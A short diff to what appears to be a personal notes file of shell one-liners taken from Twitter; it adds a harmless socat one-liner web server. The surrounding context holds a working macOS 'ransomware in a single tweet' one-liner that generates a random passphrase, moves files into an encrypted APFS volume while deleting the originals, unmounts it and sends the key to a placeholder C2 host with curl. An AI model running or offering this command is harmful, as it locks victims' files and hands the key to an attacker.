@@ -1,5 +1,10 @@
 # notes 
 
+### socat web server via twitter @glennzw
+````
+socat -vv TCP-LISTEN:80,crlf,reuseaddr,fork SYSTEM:"echo HTTP/1.0 200; echo Content-Type\: text/html; echo; cat index.html"
+````
+
 ### The Apple Money Shot - Ransomware in a single tweet from @lordx64 
 ````
 sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
